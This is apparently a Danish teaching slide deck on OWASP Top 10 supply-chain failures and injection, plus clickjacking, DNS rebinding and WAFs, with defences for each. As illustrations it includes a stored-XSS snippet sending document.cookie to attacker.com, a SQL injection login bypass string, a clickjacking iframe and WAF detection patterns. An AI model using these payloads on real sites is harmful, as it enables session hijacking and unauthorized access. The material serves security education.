---
author: Esben Inglev
theme: gaia
date: Jan 2026
paginate: true
style: |
  section {
    font-size: 26px;
  }
---

# OWASP Web Top 10: A3 og A5

---

### Hvad er OWASP?

<!--
Talking points:
- OWASP står for Open Web Application Security Project
- Non-profit grundlagt i 2001, community-drevet organisation
- Fokuserer på at forbedre software sikkerhed gennem education og awareness
- Tilbyder gratis ressourcer: dokumentation, værktøjer som ZAP, guidelines
- Top 10 listen er industri standard - alle security professionals kender den
- Opdateres hvert 3-4 år baseret på real-world data fra virksomheder og security eksperter
-->

- **Open Web Application Security Project**
- Non-profit organisation grundlagt 2001
- Fokus på at forbedre software sikkerhed
- Tilbyder gratis ressourcer, værktøjer og dokumentation
- OWASP Top 10 = industri standard for web sikkerhedsrisici
- Opdateres hvert 3-4 år baseret på data og eksperter

---

### A03: Software Supply Chain Failures

<!--
Talking points:
- Supply Chain Failures: sikkerhedsproblemer i hele software development lifecycle
- Moderne apps er bygget på hundredvis af tredjepartskomponenter - stor risiko
- Komponenter med kendte CVE sårbarheder der ikke patches
- Kompromitterede build systems: angriber får adgang til CI/CD og injicerer malware
- Malicious packages: hackere uploader ondsindet kode til NPM, VCCode plugins osv.
- Opdateringer uden signaturverifikation: kan pushes af angribere
- Uautentificerede komponenter: ingen verifikation af kilden
-->

## Hvad er det?

**Definition:** Sårbarheder eller kompromittering i software-udviklingskæden

**Omfatter:**

- Brug af komponenter med kendte sårbarheder
- Kompromitterede build-systemer og CI/CD pipelines
- Malicious packages og dependencies
- Uauthentificerede tredjepartskomponenter

---

### A03: Angrebsvektorer

<!--
Talking points:
- **Typosquatting:** Angriber uploader "reqeusts" håber på udviklere laver stavefejl
- **Account takeover:** Hacker får adgang til maintainers NPM account, pusher malware
- **SolarWinds:** Historisk angreb hvor build server blev kompromitteret, malware i alle updates
- **GlassWorm:** 2025 angreb på VS Code extensions - viser aktualiteten
- **Dependency Confusion:** Intern pakke "company-utils" vs public "company-utils" - package manager vælger forkert
- **Log4Shell:** CVE-2021-44228 - kritisk Remote Code Execution i Log4j library, påvirkede millioner af apps
-->

**1. Malicious Packages**

- Typosquatting (f.eks. "reqeusts" i stedet for "requests")
- Account takeover af maintainers

**2. Kompromitterede Build Systems**

**3. Dependency Confusion**

- Public package overtager internal dependency navn

**4. Vulnerable Components**

- Log4Shell (CVE-2021-44228): Kritisk RCE

---

### A03: Eksempel - NPM Økosystemet

<!--
Talking points:
- NPM install typisk tilføjer 800+ packages for ét projekt - enorm attack surface
- npm audit viser 23 sårbarheder er normalt - mange ignorer det
- **Problemet:** Dependency tree er dyb - du installerer dependencies af dependencies af dependencies
- Én sårbar pakke dybt nede i træet påvirker hele applikationen
- Automatiske opdateringer er risikable - kan introducere malware (left-pad incident)
- **event-stream:** Populær pakke, maintainer blev træt og gav adgang væk til "hjælper" som var hacker
- **ua-parser-js:** 8 millioner downloads/uge - maintainers NPM account blev hacket, malware pushed
-->

**Scenario: Node.js projekt med dependencies**

```bash
$ npm install
...
added 847 packages from 531 contributors

$ npm audit
found 23 vulnerabilities (5 moderate, 18 high)
```

**Problemet:**

- Moderne apps har hundredvis af dependencies
- Transitive dependencies (dependencies af dependencies)
- Én sårbar pakke påvirker hele projektet
- Automatiske opdateringer kan introducere malicious code

---

### A03: Sikringsmetoder

<!--
Talking points:
- **SBOM (Software Bill of Materials):** Komplet liste over alle komponenter i din software
- Gør det muligt at identificere påvirkede systemer når ny CVE opdages
- **Trusted sources:** Download kun fra officielle repositories, ikke tilfældige GitHub links
- **Signature verification:** Verificer at packages er signeret af legitime maintainers
- **Checksums:** SHA256 hash verifikation sikrer fil ikke er manipuleret
- **CVE scanning:** Automatisk check mod vulnerability databases (NVD, Snyk, etc.)
- **SCA værktøjer:** Software Composition Analysis - Snyk, Dependabot, WhiteSource
-->

**1. Software Bill of Materials (SBOM)**

- Vedligehold komplet oversigt over komponenter
- Track dependencies og transitive dependencies

**2. Verificer og Valider**

- Brug kun trusted sources og signerede packages
- Implementer signature verification
- Check checksums

**3. Kontinuerlig Monitorering**

- Scan for CVEs i dependencies
- Automatiser opdateringer hvor muligt
- Brug SCA (Software Composition Analysis) værktøjer

---

### A03: Sikringsmetoder (fortsat)

<!--
Talking points:
- **CI/CD hardening:** Build pipelines er kritiske targets - kræver Multi-Factor Authentication
- **Audit logs:** Track hvem der ændrer build scripts og deployments
- **Isoleret build miljø:** Sandboxed containers så kompromittering ikke spreder sig
- **Least privilege:** Build agents har kun de permissions de absolut behøver
- **Developer workstations:** Ofte weakest link - antivirus, disk encryption, screen lock
- **IDE extensions:** VS Code extensions kan være malware (GlassWorm eksempel)
- **Security awareness:** Train developers til at spotte phishing, typosquatting
- **Code review:** Fire øjne princip - andet par øjne kan spotte suspekt dependency tilføjelse
-->

**4. Hardned CI/CD Pipeline**

- Implementer access control og MFA
- Audit logs for alle ændringer

**5. Developer Security**

- Beskyt developer workstations
- Kontroller IDE extensions
- Security awareness træning
- Code review processer

---

### A05: Injection

<!--
Talking points:
- Injection: Angriber får malicious data eller kommandoer til at blive eksekveret af programmet
- Sker når untrusted data sendes til en interpreter (SQL, OS shell, JavaScript engine)
- SQL Injection er klassikeren - manipuler database queries
- XML Injection, XSS (Cross-Site Scripting), Command Injection, LDAP Injection
- Faldt fra #3 i 2021 til #5 i 2025 fordi frameworks er blevet bedre til at beskytte
- Men stadig ekstremt kritisk fordi konsekvenserne er så alvorlige (data breach, RCE)
-->

## Hvad er det?

**Definition:** Injektion af malicious data/kommandoer i et program

**Typer:**

- **SQL Injection**
- XML Injection
- **Cross-Site Scripting** (XSS)
- ...

**Status:** Faldt fra #3 (2021) til #5 (2025), men stadig kritisk

---

### SQL Injection - Hvordan virker det?

<!--
Talking points:
- String concatenation med user input er dødssynden i SQL
- UserInput bruges direkte i query string uden escaping/sanitization
- **Angreb:** admin' OR '1'='1 lukker streng og tilføjer OR betingelse
- OR '1'='1 er altid sand - returnerer derfor alle brugere
- Kan også bruges til: UNION attacks (få data fra andre tabeller), blind SQL injection
- Værste konsekvens: Full database dump, DROP tables, execute OS commands (xp_cmdshell)
-->

**Usikker kode:**

```
String query = "SELECT * FROM users WHERE
               username='" + userInput + "'";
```

**Angreb:**
Input: `admin' OR '1'='1`

**Resulterende query:**

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1'
```

**Resultat:** Returnerer alle brugere, bypasser login

---

### Cross-Site Scripting (XSS)

<!--
Talking points:
- XSS: Injektion af malicious JavaScript i web pages som andre brugere ser
- **Stored XSS:** Script gemmes permanent i database (forum post, kommentar), rammer alle besøgende
- Eksempel: Fetch sender cookie til angribers server - account takeover
- **Reflected XSS:** Script i URL parameter reflekteres direkte tilbage i response (phishing link)
- Offer klikker link, script kører i deres browser context
- **DOM-based XSS:** Client-side JavaScript manipulerer DOM med untrusted data (document.write)
- Ingen server involveret - sker kun i browser
-->

**Definition:** Injektion af malicious scripts i web pages

**Typer:**

**1. Stored XSS:** Script gemmes på serveren

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

**2. Reflected XSS:** Script i URL parameter

```
site.com/search?q=<script>alert('XSS')</script>
```

**3. DOM-based XSS:** Client-side manipulation

---

### XSS - Konsekvenser

<!--
Talking points:
- **Session hijacking:** Stjæle session cookies og impersonate offeret - fuld account takeover
- **Keylogging:** Capture alle tastetryk inkl. passwords og kreditkort
- **Phishing:** Injicere falske login forms der sender credentials til angriber
- **Defacement:** Ændre udseendet af website, skade brand reputation
- **Udfør handlinger:** Poste som offeret, ændre password, sende penge
- **Malware distribution:** Redirect til exploit kits der installer malware
- XSS er gateway til mange andre angreb
-->

**Hvad kan en angriber gøre?**

- Stjæle session cookies → Account takeover
- Keylogging
- Phishing attacks
- Defacement af website
- Udfør handlinger som ofret
- Installere malware

---

### A05: Sikringsmetoder

<!--
Talking points:
- **Prepared Statements:** Query structure defineres først med placeholders (?)
- User input indsættes derefter som parametre - databasen ved det er data, ikke kode
- Database driver escaper automatisk special characters
- Fungerer fordi SQL parser ser parametrene som literals, ikke som SQL syntax
- **Input validation:** Whitelist approach - kun tillad tegn der er nødvendige (a-z, 0-9)
- Reject alt suspekt input (' OR --, <script>, etc.)
- Validate datatype (email format, numerisk værdi), length limits, format constraints
-->

**1. Prepared Statements / Parameterized Queries**

```csharp
using var cmd = new SqlCommand(
  "SELECT * FROM users WHERE username = @username", conn);
cmd.Parameters.AddWithValue("@username", userInput);
```

**2. Input Validation**

- Whitelist tilgang (accepter kun gyldige tegn)
- Reject suspicious input
- Validate datatype, length, format

---

### A05: Sikringsmetoder (fortsat)

<!--
Talking points:
- **Output Encoding:** Escape special characters baseret på output context
- HTML encoding: &lt; i stedet for < så browser renderer tekst, ikke tags
- JavaScript encoding, URL encoding for query params, CSS encoding
- Context-aware escaping: Forskellige regler for HTML body vs HTML attribute vs JavaScript
- **Moderne frameworks:** React og Angular escaper automatisk ved default
- React: {variable} bliver automatisk escaped, Angular: {{variable}} samme
- ORM frameworks (Entity Framework, Hibernate) bruger prepared statements by default
- Reducer risikoen dramatisk hvis brugt korrekt
-->

**3. Output Encoding**

- HTML encoding: `<` → `&lt;`
- JavaScript encoding
- URL encoding
- CSS encoding
- Context-aware escaping

**4. Brug Sikre Frameworks**

- Modern frameworks med built-in beskyttelse
- React, Angular: Automatisk XSS protection
- ORM frameworks for database queries

---

### A05: Sikringsmetoder (fortsat)

<!--
Talking points:
- **CSP (Content Security Policy):** HTTP header der definerer trusted sources for scripts
- default-src 'self': Kun load resources fra eget domæne
- script-src: Kun scripts fra self og trusted.cdn.com tilladt
- Blokerer inline scripts og eval() by default - stoppes XSS effektivt
- **Least Privilege:** Database user har kun SELECT på user table, ikke DROP/DELETE
- Separate read-only vs read-write accounts
- App bruger aldrig admin credentials - begrænser skaden ved SQL injection
- **Testing:** SAST scanner kildekode for injection patterns, DAST tester running app
- Penetration testing af security eksperter finder komplekse injection chains
-->

**5. Content Security Policy (CSP)**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' trusted.cdn.com
```

**6. Principle of Least Privilege**

- Database bruger med minimale rettigheder
- Separate læse/skrive accounts
- Ingen admin rettigheder til app

**7. Testing**

- Static Analysis (SAST)
- Dynamic Analysis (DAST)
- Penetration testing

---

### Clickjacking

<!--
Talking points:
- Clickjacking (UI redressing): Visuelt bedrag hvor bruger klikker på noget skjult
- Angriber laver attraktiv fake side (gratis iPad, viral video, etc.)
- Target site (bank.com) loades i transparent iframe ovenpå fake content
- Iframe positioneres præcist så "Gratis iPad" knappen er over "Overfør penge" knappen
- Bruger tror de klikker på iPad, men klikker faktisk gennem transparent iframe
- Kan bruges til: Tilladelser (webcam/mic access), social media likes, pengeoverførsler
- Også kaldet UI redress attack
-->

## Hvad er det?

**Definition:** UI redress attack - narrer brugere til at klikke på skjulte elementer

**Hvordan:**

1. Angriber laver en falsk/lokkende side
2. Loader target site i transparent iframe
3. Positionerer iframe over lokkende knapper
4. Bruger tror de klikker på én ting, men aktiverer andet

**Også kaldt:** UI redressing

---

### Clickjacking - Eksempel Scenario

<!--
Talking points:
- Evil.com loader bank.com transfer side i iframe med opacity:0 (helt transparent)
- Position:absolute gør det muligt at placere præcist over fake button
- Bruger ser kun "GRATIS iPad" call-to-action knap
- Når de klikker, rammer klikket den usynlige iframe
- Aktiverer "Overfør 1000kr" knappen på bank.com
- Session cookie sendes automatisk så bruger er authenticated
- Pengene går til angriber uden bruger ved det
- Kan også bruges til: Enable webcam, give permissions, delete account
-->

**Angribers side:**

```html
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute">
</iframe>
<button>GRATIS iPad! KLIK HER!</button>
```

**Hvad sker der:**

- Bruger ser "GRATIS iPad" knappen
- Klikker på den
- Klikket rammer den skjulte iframe
- Aktiverer "Overfør penge" på bank.com
- Angriber modtager pengene

---

### Clickjacking - Beskyttelse

<!--
Talking points:
- **X-Frame-Options:** HTTP response header der kontrollerer iframe embedding
- DENY: Siden kan aldrig loades i iframe - stærkeste beskyttelse
- SAMEORIGIN: Kun tillad iframe fra samme domæne (bank.com kan iframe bank.com)
- **CSP frame-ancestors:** Moderne alternativ til X-Frame-Options, mere fleksibel
- 'none' = DENY, 'self' = SAMEORIGIN
- **SameSite Cookies:** Strict forhindrer cookies sendt i cross-site requests
- Så selv hvis iframe loader, er bruger ikke authenticated
-->

**1. X-Frame-Options Header**

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

**2. Content Security Policy**

```
Content-Security-Policy:
  frame-ancestors 'none';
  frame-ancestors 'self';
```

**3. SameSite Cookies**

```
Set-Cookie: session=abc123; SameSite=Strict
```

---

### DNS Rebinding

<!--
Talking points:
- DNS Rebinding: Avanceret angreb der bypasser Same-Origin Policy
- Same-Origin Policy: Browser sikkerhedsregel der kun tillader JavaScript at tilgå samme domæne
- Angrebsflow: Bruger besøger evil.com, DNS returnerer først angribers public IP
- Browser loader malicious JavaScript fra angribers server
- JavaScript laver nye requests til evil.com efter få sekunder
- Nu returnerer DNS en INTERN IP adresse (192.168.1.1 - brugerens router)
- Browser tillader det fordi domænet er stadig "evil.com" - same origin!
- Angriber kan nu bruge offerets browser til at tilgå interne devices
- Kan kompromittere routers, IoT devices, internal web apps
-->

## Hvad er det?

**Definition:** Angreb der omgår Same-Origin Policy ved at manipulere DNS

**Hvordan det virker:**

```
Trin 1: DNS Query for evil.com → 1.2.3.4 (angribers server)
Trin 2: Browser loader JavaScript fra 1.2.3.4
Trin 3: JS laver ny request til evil.com
Trin 4: DNS Query for evil.com → 192.168.1.1 (router)
Trin 5: Browser tillader (samme origin: evil.com)
Trin 6: Angriber kontrollerer router, IoT devices etc.
```

**Nøgle:** Meget kort TTL (0-1 sekund) på DNS record

---

### DNS Rebinding - Beskyttelse

<!--
Talking points:
- **Host header validation:** Lav en host header whitelist. Web app tjekker Host header i HTTP request
- Reject hvis Host header er unexpected (ikke på whitelist)
- Kan detektere når evil.com pludselig peger på localhost
- **Browser DNS pinning:** Moderne browsere ignorer meget korte TTLs
- Cacher DNS resultat i mindst 60 sekunder uanset TTL
- Gør rebinding langsommere og mindre pålidelig
-->

**1. Host Header Validation**

- Verificer Host header i alle requests - whitelist
- Reject requests med unexpected hosts

**2. Browser DNS Caching**

- Browsere omgår den korte TTL

---

### Web Application Firewall (WAF)

<!--
Talking points:
- WAF opererer på OSI Layer 7 (Application layer) i modsætning til network firewall (Layer 3-4)
- Forstår HTTP/HTTPS protokollen og web application logik
- Sidder som reverse proxy mellem klienter og web server
- Analyserer HTTP requests (headers, body, cookies) før de når serveren
- Blokerer malicious requests baseret på regler eller ML models
- **Positive (Whitelist):** Default deny - kun tillad specifikt godkendt traffic
- **Negative (Blacklist):** Default allow - blok kun kendt dårligt traffic (SQL injection patterns)
- **Hybrid:** Kombination - mest praktisk og almindeligt brugt
-->

**Definition:** Firewall på applikationslaget (Layer 7) der filtrerer HTTP/HTTPS traffic

**Funktion:**

- Analyserer HTTP requests og responses
- Blokerer malicious requests før de når serveren
- Regel-baseret eller ML-baseret detection
- Position: Reverse proxy mellem klienter og server

**Security Models:**

- **Positive (Whitelist):** Tillad kun kendt godt traffic
- **Negative (Blacklist):** Blokér kendt dårligt traffic
- **Hybrid:** Kombination - mest almindelig

---

### WAF - Beskyttelse og Deployment

<!--
Talking points:
- **SQL Injection beskyttelse:** Pattern matching for SQL syntax (' OR 1=1, UNION SELECT, etc.)
- **XSS beskyttelse:** Detekterer <script> tags, JavaScript events, HTML encoding issues
- **Rate limiting:** Max X requests per IP per minut - forhindrer brute force og DoS
- **Session validation:** Tracker session anomalies, detekterer session hijacking
- **OWASP CRS:** Core Rule Set - open-source collection af WAF regler der dækker Top 10
- **Cloud WAF:** Cloudflare, AWS WAF, Azure WAF - hurtig deployment, auto-scaling, global CDN
- **On-premise:** F5, ModSecurity - fuld kontrol, compliance requirements, data locality
- **Begrænsning:** Ikke silver bullet - kan bypasses med obfuscation, false positives kræver tuning
- Defense in Depth: WAF supplement til secure coding practices, ikke erstatning
-->

**Beskytter mod:**

- SQL Injection (pattern matching for SQL syntax)
- XSS (script tag detection, HTML encoding enforcement)
- Rate limiting og session validation
- OWASP CRS: Open-source regel set der dækker Top 10

**Deployment:**

- **Cloud WAF:** Hurtig deployment, auto-scaling (Cloudflare, AWS WAF)
- **On-premise:** Fuld kontrol, compliance (F5, ModSecurity)

**Begrænsning:** Ikke silver bullet - kan bypasses, kræver tuning, skal kombineres med secure coding (Defense in Depth)

---
